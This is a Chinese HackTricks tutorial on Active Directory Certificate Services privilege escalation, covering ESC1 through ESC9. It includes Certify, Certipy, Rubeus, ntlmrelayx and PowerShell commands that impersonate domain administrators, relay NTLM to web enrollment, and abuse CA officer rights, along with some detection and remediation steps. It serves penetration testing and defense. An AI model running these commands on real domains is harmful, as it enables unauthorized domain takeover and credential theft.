# AD CS 域提权

{{#include ../../../banners/hacktricks-training.md}}


**以下是相关文章中提权技术部分的摘要：**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 配置错误的证书模板 - ESC1

### 说明

### 配置错误的证书模板 - ESC1 详解

- **Enterprise CA 向低权限用户授予了注册权限。**
- **不需要管理员批准。**
- **不需要授权人员的签名。**
- **证书模板上的安全描述符权限过于宽松，允许低权限用户获得注册权限。**
- **证书模板被配置为定义可促进身份验证的 EKU：**
- 包含 Client Authentication（OID 1.3.6.1.5.5.7.3.2）、PKINIT Client Authentication（1.3.6.1.5.2.3.4）、Smart Card Logon（OID 1.3.6.1.4.1.311.20.2.2）、Any Purpose（OID 2.5.29.37.0）等 Extended Key Usage（EKU）标识符，或不包含 EKU（SubCA）。
- **模板允许请求者在 Certificate Signing Request（CSR）中包含 subjectAltName：**
- 如果证书中存在 subjectAltName（SAN），Active Directory（AD）会在身份验证时优先使用它。这意味着，通过在 CSR 中指定 SAN，可以请求证书来冒充任意用户（例如域管理员）。请求者是否可以指定 SAN，由证书模板的 AD 对象中的 `mspki-certificate-name-flag` 属性决定。此属性是一个位掩码，其中存在 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志时，请求者即可指定 SAN。

> [!CAUTION]
> 上述配置允许低权限用户请求包含任意 SAN 的证书，从而能够通过 Kerberos 或 SChannel 以任意域主体的身份进行身份验证。

此功能有时会被启用，以支持产品或部署服务动态生成 HTTPS 或主机证书，也可能是由于缺乏相关理解。

需要注意的是，使用此选项创建证书会触发警告；但复制现有证书模板（例如已启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的 `WebServer` 模板），然后修改副本以加入身份验证 OID 时，则不会触发该警告。<sup>[[6]](#references)</sup>

### 滥用

要**查找存在漏洞的证书模板**，可以运行：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
要**滥用此漏洞冒充管理员**，可以运行：
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
然后，你可以将生成的 **certificate 转换为 `.pfx`** 格式，并再次使用 Rubeus 或 certipy 进行 **authenticate**：<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 二进制文件 "Certreq.exe" 和 "Certutil.exe" 可用于生成 PFX：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

可以通过运行以下 LDAP 查询，枚举 AD Forest 配置架构中的证书模板，具体包括：不需要审批或签名、具有 Client Authentication 或 Smart Card Logon EKU，且启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志的证书模板：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 配置错误的证书模板 - ESC2

### 说明

第二种滥用场景是第一种场景的变体：

1. Enterprise CA 向低权限用户授予证书注册权限。
2. 禁用管理器审批要求。
3. 省略对授权签名的要求。
4. 证书模板上过于宽松的安全描述符向低权限用户授予证书注册权限。
5. **证书模板被定义为包含 Any Purpose EKU 或不包含 EKU。**

**Any Purpose EKU** 允许攻击者为**任何用途**获取证书，包括客户端身份验证、服务器身份验证、代码签名等。可以采用与 **ESC3** 相同的 **technique** 来利用此场景。

**不包含 EKU** 的证书充当从属 CA 证书，可被利用于**任何用途**，并且**还可用于签发新证书**。因此，攻击者可以利用从属 CA 证书，在新证书中指定任意 EKU 或字段。

但是，如果从属 CA 不受 **`NTAuthCertificates`** 对象信任（默认设置），则为**域身份验证**创建的新证书将无法使用。尽管如此，攻击者仍然可以创建具有**任意 EKU** 和任意证书值的**新证书**。这些证书可能被**滥用于**各种用途（例如代码签名、服务器身份验证等），并可能对网络中的其他应用程序（如 SAML、AD FS 或 IPSec）产生重大影响。<sup>[[6]](#references)</sup>

若要枚举 AD Forest 配置架构中符合此场景的模板，可以运行以下 LDAP 查询：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 配置错误的 Enrolment Agent Templates - ESC3

### 说明

此场景与第一种和第二种场景类似，但**滥用**了**不同的 EKU**（Certificate Request Agent）和 **2 个不同的 templates**（因此有 2 组要求）。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）在 Microsoft 文档中称为 **Enrollment Agent**，允许主体代表**其他用户**为其**注册**一张**证书**。

**“enrollment agent”**在此类 **template** 中进行注册，并使用生成的**证书代表其他用户为 CSR 进行联合签名**。随后，它将**联合签名的 CSR**发送给 CA，注册一个**允许“代表他人注册”**的 **template**，CA 则会返回一张属于**“其他”用户**的**证书**。<sup>[[6]](#references)</sup>

**要求 1：**

- Enterprise CA 向低权限用户授予了 enrollment 权限。
- 未启用 manager approval 要求。
- 不要求 authorized signatures。
- 证书 template 的 security descriptor 过于宽松，向低权限用户授予了 enrollment 权限。
- 证书 template 包含 Certificate Request Agent EKU，使其能够代表其他主体请求其他 certificate templates。

**要求 2：**

- Enterprise CA 向低权限用户授予了 enrollment 权限。
- 绕过了 manager approval。
- template 的 schema version 为 1 或大于 2，并指定了要求 Certificate Request Agent EKU 的 Application Policy Issuance Requirement。
- 证书 template 中定义的某个 EKU 允许进行 domain authentication。
- CA 上未应用针对 enrollment agents 的限制。

### 利用

你可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来利用此场景：<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
允许**获取** **enrollment agent certificate** 的 **users**、允许 **agents** 进行 enrollment 的模板，以及 enrollment agent 可以代表其操作的 **accounts**，都可以由 enterprise CAs 进行限制。具体操作是打开 `certsrc.msc` **snap-in**，**右键单击 CA**，**点击 Properties**，然后**导航**到“Enrollment Agents”选项卡。

不过需要注意，CA 的**默认**设置是“**Do not restrict enrollment agents**”。当管理员启用对 enrollment agents 的限制，将其设置为“Restrict enrollment agents”时，默认配置仍然极其宽松。它允许 **Everyone** 访问所有模板，并以任意身份进行 enrollment。

### Windows-only PowerShell PoCs with Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) 无需 Certify 或 Certipy 即可执行 ESC1 和 ESC2/ESC3。其脚本通过 `X509Enrollment` COM API 创建可导出的 2048 位 RSA 密钥，构建 PKCS#10 请求，通过 LDAP 查找第一个 `pKIEnrollmentService`，使用 `CertificateAuthority.Request` 提交请求，将响应安装到 `Cert:\CurrentUser\My`，并导出 Base64 编码的 PFX。ESC1 脚本添加攻击者选择的 UPN SAN（`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`，值为 `0xb`），而 ESC2/ESC3 脚本使用第一个 certificate 对代表请求的 PKCS#7 进行签名。<sup>[[27]](#references)</sup>
```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
-altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
-target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```
这些脚本会打印 **PFX** 的 Base64 编码，其中包含私钥，可直接与 Rubeus 配合使用。不要将其替换为 `[Convert]::ToBase64String($cert.RawData)`：`RawData` 仅对公共证书进行编码，无法为 PKINIT 请求签名。<sup>[[5]](#references)[[27]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```
## 易受攻击的证书模板访问控制 - ESC4

### **说明**

**证书模板**上的**安全描述符**定义了特定 **AD 主体**对该模板拥有的**权限**。

如果**攻击者**拥有足够的**权限**来**修改**某个**模板**，并**实施**前文所述的任何**可利用错误配置**，则可能实现权限提升。

适用于证书模板的重要权限包括：<sup>[[6]](#references)</sup>

- **Owner：**授予对对象的隐式控制权，允许修改任何属性。
- **FullControl：**授予对对象的完整控制权，包括修改任何属性的能力。
- **WriteOwner：**允许将对象的所有者修改为攻击者控制的主体。
- **WriteDacl：**允许调整访问控制，从而可能授予攻击者 FullControl。
- **WriteProperty：**允许编辑对象的任何属性。

### 利用

使用 Certify 进行枚举，以识别对模板和其他 PKI 对象拥有编辑权限的主体：
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
前一个示例中类似的 privesc：

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 是指用户对证书模板拥有写入权限。例如，可以利用这一点覆盖证书模板的配置，使该模板容易受到 ESC1 攻击。

如上方路径所示，只有 `JOHNPC` 拥有这些权限，但我们的用户 `JOHN` 与 `JOHNPC` 之间新增了 `AddKeyCredentialLink` 边。由于该技术与证书相关，我也实现了这种攻击，即 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)。<sup>[[8]](#references)</sup> 下面是 Certipy 的 `shadow auto` 命令用于获取受害者 NT hash 的简单预览。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** 可以使用单条命令覆盖证书模板的配置。**默认情况下**，Certipy 会**覆盖**配置，使其**易受 ESC1 攻击**。我们也可以指定 **`-save-old` 参数来保存旧配置**，这对于在攻击后**恢复**配置很有用。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

由 ACL 驱动的互联关系网络十分复杂，其中包含多个超出 certificate templates 和 certificate authority 范围的对象，并可能影响整个 AD CS 系统的安全性。这些可能显著影响安全性的对象包括：

- CA server 的 AD computer object，该对象可能通过 S4U2Self 或 S4U2Proxy 等机制遭到攻陷。
- CA server 的 RPC/DCOM server。
- 特定容器路径 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 中的任何后代 AD object 或 container。该路径包括但不限于 Certificate Templates container、Certification Authorities container、NTAuthCertificates object 和 Enrollment Services Container 等容器与对象。

如果低权限攻击者设法控制其中任何一个关键组件，PKI 系统的安全性就可能遭到破坏。<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) 中讨论的主题也涉及 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag 的影响，Microsoft 对此也进行了说明。在 Certification Authority (CA) 上启用此配置后，可以在**任何请求**中加入 **user-defined values** 作为 **subject alternative name**，包括从 Active Directory® 构造的请求。因此，攻击者可以通过任何为 domain **authentication** 配置的 template 进行 enrollment，尤其是允许 **unprivileged** 用户 enrollment 的 template，例如标准 User template。这样，攻击者就可以获取 certificate，并以 domain administrator 或 domain 中的**任何其他活动实体**进行 authentication。<sup>[[9]](#references)</sup>

**Note**：通过 `certreq.exe` 中的 `-attrib "SAN:"` 参数（称为 “Name Value Pairs”）将 **alternative names** 添加到 Certificate Signing Request (CSR) 的方法，与 ESC1 中利用 SAN 的方式有所不同。区别在于**账户信息的封装方式**不同：这里的信息位于 certificate attribute 中，而不是 extension 中。

### Abuse

组织可以使用以下 `certutil.exe` 命令验证该设置是否已启用：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
此操作本质上采用 **remote registry access**，因此，另一种方法可能是：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
诸如 [**Certify**](https://github.com/GhostPack/Certify) 和 [**Certipy**](https://github.com/ly4k/Certipy) 之类的工具能够检测此配置错误并利用它：<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
要修改这些设置，前提是拥有**域管理员**权限或同等权限，可以在任意工作站上执行以下命令：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
要在你的环境中禁用此配置，可以使用以下命令移除该标志：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 在 2022 年 5 月安全更新之后，新签发的 **证书** 将包含一个 **安全扩展**，其中包含 **请求者的 `objectSid` 属性**。对于 ESC1，此 SID 根据指定的 SAN 派生。但是，对于 **ESC6**，该 SID 反映的是 **请求者的 `objectSid`**，而不是 SAN。\
> 要利用 ESC6，系统必须容易受到 ESC10（Weak Certificate Mappings）的影响，因为 ESC10 会优先使用 **SAN，而不是新的安全扩展**。

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

证书颁发机构的访问控制通过一组用于管理 CA 操作的权限来维护。可以通过访问 `certsrv.msc`，右键单击 CA，选择属性，然后转到“安全”选项卡来查看这些权限。此外，还可以使用 PSPKI module，通过以下命令枚举权限：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
这提供了对主要权限的深入了解，即 **`ManageCA`** 和 **`ManageCertificates`**，分别对应“CA administrator”和“Certificate Manager”角色。<sup>[[6]](#references)</sup>

#### 滥用

在证书颁发机构上拥有 **`ManageCA`** 权限，使主体能够使用 PSPKI 远程操纵设置。这包括启用 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志，以允许在任何模板中指定 SAN，这是 domain escalation 的关键环节。

使用 PSPKI 的 **Enable-PolicyModuleFlag** cmdlet 可以简化此过程，无需直接与 GUI 交互即可完成修改。

拥有 **`ManageCertificates`** 权限可以批准 pending requests，从而有效绕过“CA certificate manager approval”这一安全防护措施。

可以结合使用 **Certify** 和 **PSPKI** 模块来请求、批准并下载证书：
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 攻击 2

#### 说明

> [!WARNING]
> 在**之前的攻击**中，使用了 **`Manage CA`** 权限来**启用** **EDITF_ATTRIBUTESUBJECTALTNAME2** 标志，以执行 **ESC6 attack**，但在重启 CA 服务（`CertSvc`）之前不会生效。当用户拥有 **`Manage CA`** 访问权限时，该用户也可以**重启服务**。但是，这**并不意味着用户可以远程重启服务**。此外，由于 2022 年 5 月的安全更新，在大多数已打补丁的环境中，E**SC6 可能无法开箱即用**。
>
> 因此，这里介绍另一种攻击。

前提条件：

- 仅需 **`ManageCA` permission**
- **`Manage Certificates`** permission（可以从 **`ManageCA`** 授予）
- Certificate template **`SubCA`** 必须**启用**（可以从 **`ManageCA`** 启用）

该技术利用了这样一个事实：拥有 **`Manage CA`** 和 **`Manage Certificates`** 访问权限的用户可以**签发失败的证书请求**。**`SubCA`** certificate template **易受 ESC1 攻击**，但只有**管理员**可以在该模板中进行 enrollment。因此，**用户**可以请求在 **`SubCA`** 中进行 enrollment——该请求会被**拒绝**——但之后可由管理者签发。<sup>[[6]](#references)</sup>

#### 滥用

你可以将自己的用户添加为新的负责人，从而**授予自己 `Manage Certificates`** 访问权限。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 模板可以通过 `-enable-template` 参数在 CA 上**启用**。默认情况下，`SubCA` 模板处于启用状态。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
如果我们已满足此攻击的前置条件，就可以开始**请求基于 `SubCA` 模板的证书**。

**此请求将被拒绝**，但我们会保存私钥并记下请求 ID。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
通过 **`Manage CA` 和 `Manage Certificates`**，我们随后可以使用 `ca` 命令及 `-issue-request <request ID>` 参数**签发失败的证书**请求。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最后，我们可以使用 `req` 命令和 `-retrieve <request ID>` 参数来**获取已颁发的证书**。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### 说明

除了经典的 ESC7 abuse（启用 EDITF attributes 或批准 pending requests）之外，**Certify 2.0** 还揭示了一种全新的 primitive，仅需要 Enterprise CA 上的 *Manage Certificates*（又称 **Certificate Manager / Officer**）role。<sup>[[3]](#references)</sup>

任何拥有 *Manage Certificates* 的 principal 都可以执行 `ICertAdmin::SetExtension` RPC method。该 method 传统上由合法 CA 用于更新 **pending** requests 上的 extensions，但攻击者可以滥用它，向等待批准的 request **追加一个 *non-default* certificate extension**（例如自定义的 *Certificate Issuance Policy* OID，如 `1.1.1.1`）。

由于目标 template **没有为该 extension 定义默认值**，因此当 request 最终被 issued 时，CA **不会**覆盖攻击者控制的值。由此生成的 certificate 会包含攻击者选择的 extension，可能：

* 满足其他 vulnerable templates 的 Application / Issuance Policy requirements（从而实现 privilege escalation）。
* 注入额外的 EKUs 或 policies，使该 certificate 在 third-party systems 中获得非预期的信任。

简而言之，*Manage Certificates* ——此前被认为是 ESC7 中“功能较弱”的一半——现在可以被用于实现完整的 privilege escalation 或长期 persistence，而无需修改 CA configuration，也不需要权限限制更严格的 *Manage CA* right。

#### 使用 Certify 2.0 abuse 该 primitive

1. **提交一个会保持为 *pending* 的 certificate request。** 可以使用要求 manager approval 的 template 强制实现：
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 使用新的 `manage-ca` command 向 pending request **追加 custom extension**：
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*如果 template 尚未定义 *Certificate Issuance Policies* extension，上述值将在 issuance 后被保留。*

3. **Issue 该 request**（如果你的 role 同时拥有 *Manage Certificates* approval rights），或等待 operator 批准它。Issued 后，下载 certificate：
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成的 certificate 现在包含恶意的 issuance-policy OID，可用于后续 attacks（例如 ESC13、domain escalation 等）。

> NOTE: 也可以通过 `ca` command 和 `-set-extension` parameter，使用 Certipy ≥ 4.7 执行相同的 attack。

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 说明

> [!TIP]
> 在安装了 **AD CS** 的环境中，如果存在一个 **web enrollment endpoint vulnerable**，并且至少有一个已 published 的 **certificate template** 允许 **domain computer enrollment and client authentication**（例如默认的 **`Machine`** template），那么**任何启用了 spooler service 的 computer 都可能被 attacker compromise**！

AD CS 支持多种 **基于 HTTP 的 enrollment methods**，这些 methods 通过 administrators 可以安装的额外 server roles 提供。这些用于基于 HTTP 进行 certificate enrollment 的 interfaces 容易受到 **NTLM relay attacks** 的影响。攻击者从 **compromised machine** 出发，可以 impersonate 任何通过 inbound NTLM 进行 authentication 的 AD account。在 impersonate victim account 的情况下，攻击者可以访问这些 web interfaces，使用 `User` 或 `Machine` certificate templates **request 一个 client authentication certificate**。

- **web enrollment interface**（一种较旧的 ASP application，可通过 `http://<caserver>/certsrv/` 访问）默认仅使用 HTTP，不提供针对 NTLM relay attacks 的保护。此外，它通过 Authorization HTTP header 明确仅允许 NTLM authentication，因此 Kerberos 等更安全的 authentication methods 不适用。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service 和 **Network Device Enrollment Service**（NDES）默认通过其 Authorization HTTP header 支持 negotiate authentication。Negotiate authentication **同时支持 Kerberos 和 NTLM**，因此攻击者可以在 relay attacks 期间将 authentication **downgrade 为 NTLM**。尽管这些 web services 默认启用 HTTPS，但仅使用 HTTPS **无法防护 NTLM relay attacks**。只有 HTTPS 与 channel binding 结合使用时，才能为 HTTPS services 提供 NTLM relay attack protection。遗憾的是，AD CS 不会在 IIS 上启用 Extended Protection for Authentication，而 channel binding 需要该功能。<sup>[[6]](#references)</sup>

NTLM relay attacks 的一个常见 **issue** 是 **NTLM sessions 的持续时间很短**，以及攻击者无法与 **require NTLM signing** 的 services 交互。

不过，通过利用 NTLM relay attack 为 user 获取 certificate，可以克服这一限制，因为 certificate 的 validity period 决定了 session 的持续时间，并且该 certificate 可以用于 **mandate NTLM signing** 的 services。有关如何使用 stolen certificate 的说明，请参阅：

{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks 的另一个限制是，**victim account 必须对 attacker-controlled machine 进行 authentication**。攻击者可以等待，或尝试 **force** 此 authentication：

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify) 的 `cas` 会枚举 **enabled HTTP AD CS endpoints**：<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 属性由企业 Certificate Authorities（CAs）用于存储 Certificate Enrollment Service（CES）端点。可以使用工具 **Certutil.exe** 解析并列出这些端点：
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### 使用 Certify 进行滥用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### 使用 [Certipy](https://github.com/ly4k/Certipy) 进行滥用

默认情况下，Certipy 会根据模板 `Machine` 或 `User` 请求证书，具体取决于被中继的账户名称是否以 `$` 结尾。通过使用 `-template` 参数，可以指定其他模板。

随后可以使用 [PetitPotam](https://github.com/ly4k/PetitPotam) 等技术强制进行身份验证。处理域控制器时，需要指定 `-template DomainController`。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 无 Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### 说明

**`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）是 **`msPKI-Enrollment-Flag`** 的新值，也称为 ESC9，可阻止在证书中嵌入**新的 `szOID_NTDS_CA_SECURITY_EXT` security extension**。当 **`StrongCertificateBindingEnforcement`** 设置为 `1`（默认设置）时，此标志会变得相关，而设置为 `2` 时则不同。在可能利用较弱的 Kerberos 或 Schannel 证书映射的场景中（如 ESC10），该标志的重要性会进一步提升，因为缺少 ESC9 并不会改变相关要求。<sup>[[7]](#references)</sup>

以下条件会使该标志的设置变得重要：

- `StrongCertificateBindingEnforcement` 未调整为 `2`（默认值为 `1`），或 `CertificateMappingMethods` 包含 `UPN` 标志。
- 证书在 `msPKI-Enrollment-Flag` 设置中标记了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
- 证书指定了任意 client authentication EKU。
- 对任意账户拥有 `GenericWrite` 权限，以便 compromise 另一个账户。

### 滥用场景

假设 `John@corp.local` 对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是 compromise `Administrator@corp.local`。`Jane@corp.local` 被允许 enroll 的 `ESC9` certificate template，在其 `msPKI-Enrollment-Flag` 设置中配置了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。

首先，利用 `John` 的 `GenericWrite`，通过 Shadow Credentials 获取 `Jane` 的 hash：
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
随后，将 `Jane` 的 `userPrincipalName` 修改为 `Administrator`，故意省略 `@corp.local` 域部分：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
此修改不违反约束，因为 `Administrator@corp.local` 仍然是 `Administrator` 的 `userPrincipalName`。

随后，以 `Jane` 的身份请求标记为易受攻击的 `ESC9` certificate template：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
需要注意的是，该证书的 `userPrincipalName` 显示为 `Administrator`，且不包含任何“object SID”。

随后，`Jane` 的 `userPrincipalName` 被恢复为其原始值 `Jane@corp.local`：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
现在，使用签发的证书尝试进行身份验证会得到 `Administrator@corp.local` 的 NT 哈希。由于证书未指定域，命令必须包含 `-domain <domain>`：
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### 说明

